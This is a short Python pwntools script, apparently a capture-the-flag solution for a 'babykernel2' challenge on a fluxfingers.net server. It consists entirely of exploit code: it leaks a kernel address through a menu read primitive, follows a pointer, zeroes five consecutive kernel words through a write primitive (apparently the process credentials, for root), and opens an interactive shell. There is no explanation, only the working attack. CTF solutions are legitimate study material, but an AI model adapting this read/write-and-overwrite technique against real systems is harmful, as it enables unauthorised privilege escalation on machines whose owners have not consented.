from pwn import *

p = remote("babykernel2.forfuture.fluxfingers.net", 1337)

p.recvuntil("- Menu -")

p.sendlineafter(">", "1")
p.sendlineafter(">", "ffffffff8183a040")

p.recvuntil(":")
leak = int(p.recvline(), 16)

p.sendlineafter(">", "1")
p.sendlineafter(">", hex(leak + 0x400)[2:])

p.recvuntil(":")
leak = int(p.recvline(), 16)

def write(offset):
  p.sendlineafter(">", "2")
  p.sendlineafter(">", hex(leak + offset)[2:])
  p.sendlineafter(">", "0")

write(0)
write(8)
write(0x10)
write(0x18)
write(0x20)

p.interactive()
